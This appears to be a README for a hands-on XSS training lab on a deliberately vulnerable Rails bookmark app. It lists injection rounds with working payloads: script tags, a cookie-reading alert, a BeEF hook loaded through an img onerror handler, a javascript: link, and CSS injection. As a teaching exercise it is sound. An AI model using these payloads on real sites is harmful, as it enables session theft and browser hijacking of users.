# # XSS hands-on with Rails application

## Install

- Install dependencies

```console
bundle install
```

- Run

```console
rails server
```

## Hack

### Round 1: HTML

Add a bookmark with html tags in comment:

- Title: 

```
OWASP Cheat Sheet Series
```

- Link

```
https://cheatsheetseries.owasp.org
```

- Comment

```
The <b>OWASP Cheat Sheet Series</b> was created to provide a concise collection of high value information on specific application security topics.
```

What happened ? and why ?


### Round 2: Alert

Add a bookmark with script tags in comment:

```
<script>alert(`XSS`)</script>
```

What happened ? and why ?

### Round 3: Cookie :fearful:

Add a bookmark with script tags in comment to get session cookie

```
<script>alert(document.cookie)</script>
```

### Round 4: Beef :scream:

```
<img src=1 href=1 onerror="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();" />
```

### Round 4: URL

Add a bookmark with javascript in link field:

```
javascript:alert('XSS')
```

this link will be well encoded to prevent XSS:

```
<a href="javascript:alert(&#39;XSS&#39;)">javascript:alert(&#39;XSS&#39;)</a>
```

What happened if you click in the link ? and why ?


### Round 5: CSS

Add a bookmark with CSS in color fiels to load an image:

```
red; background: url(https://http.cat/200)
```

What happened ? and why ?

